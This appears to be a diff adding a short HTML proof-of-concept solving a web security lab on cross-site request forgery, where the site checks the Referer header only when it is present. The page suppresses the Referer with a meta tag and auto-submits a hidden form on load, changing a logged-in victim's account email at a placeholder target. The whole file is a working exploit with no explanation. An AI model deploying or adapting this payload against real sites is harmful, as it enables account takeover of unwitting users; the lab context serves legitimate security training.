@@ -1,0 +1,17 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <meta name="referrer" content="never">
+        <title>
+            Lab: CSRF where Referer validation depends on header being present
+        </title>
+    </head>
+    <body>
+        <form action="https://WEBSITE-URL/my-account/change-email" method="post">
+            <input type="hidden" name="email" value="abcd@normal-user.net">
+        </form>
+    </body>
+    <script>
+        document.forms[0].submit()
+    </script>
+</html>
